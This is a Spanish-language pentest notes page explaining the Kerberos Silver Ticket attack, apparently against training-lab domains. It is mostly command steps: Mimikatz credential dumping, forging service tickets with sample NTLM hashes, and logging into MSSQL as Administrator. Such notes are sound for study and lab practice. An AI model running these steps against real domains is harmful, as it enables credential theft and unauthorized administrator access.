---
title: Silver Ticket
tags: [kerberos, silver-ticket, ad, spn, mimikatz]
---

# Silver Ticket

## Descripción

El Silver Ticket es un ataque de Kerberos que permite forjar un **Service Ticket (TGS)** para acceder a un servicio específico sin comunicarse con el Domain Controller.

El atacante usa el **hash NTLM de la cuenta de servicio** asociada al SPN para generar un ticket válido y autenticarse directamente contra el servicio.

> [!important] Por qué funciona con MSSQL
> El servicio MSSQL verifica que el ticket esté firmado con su propia clave de servicio. No consulta al DC. Si el usuario dentro del ticket es Administrator → acceso concedido.
> Se debe usar siempre **FQDN** con Kerberos.

## Requisitos

1. **Hash NTLM** de la cuenta de servicio
2. **Domain SID**
3. **Target SPN** (ej: MSSQL, HTTP, CIFS)

## Ataque paso a paso

### 1. Identificar cuentas con SPN

```powershell
Get-DomainUser -SPN
Get-ADUser -Filter {SamAccountName -eq "svc_mssql"} -Properties ServicePrincipalNames
```

### 2. Obtener hash NTLM

```bash
# Con Mimikatz
sekurlsa::logonpasswords
```

O generar el hash NT desde contraseña: https://codebeautify.org/ntlm-hash-generator

### 3. Obtener Domain SID

```bash
whoami /user
rpcclient -U info%info dc.hokkaido-aerospace.com -c "lookupnames discovery"
# Ej: S-1-5-21-1987370270-658905905-1781884369
```

> [!warning] Atención
> A veces se añaden números extra al final del SID — asegúrate de coger sólo el SID del dominio (sin el RID final).

### 4. Crear el Silver Ticket

```bash
# Mimikatz (Windows)
kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin
```

```bash
# Impacket (Linux)
impacket-ticketer -nthash E3A0168BC21CFB88B95C954A5B18F57C -domain-sid S-1-5-21-1969309164-1513403977-1686805993 -domain nagoya-industries.com -spn MSSQL/nagoya.nagoya-industries.com -user-id 500 Administrator
```

### 5. Exportar el ticket (Linux)

```bash
export KRB5CCNAME=$PWD/Administrator.ccache
```

### 6. Configurar /etc/krb5.conf

```ini
[libdefaults]
default_realm = NAGOYA-INDUSTRIES.COM
kdc_timesync = 1
ccache_type = 4
forwardable = true
proxiable = true
rdns = false
dns_canonicalize_hostname = false

[realms]
NAGOYA-INDUSTRIES.COM = {
    kdc = nagoya.nagoya-industries.com
}

[domain_realm]
.nagoya-industries.com = NAGOYA-INDUSTRIES.COM
```

### 7. Conectar al servicio

```bash
# MSSQL con impacket
impacket-mssqlclient -k nagoya.nagoya-industries.com
```

## Ver también
- [[05-ad-attacks/kerberos/kerberoasting|Kerberoasting]]
- [[05-ad-attacks/kerberos/constrained-delegation|Constrained Delegation]]
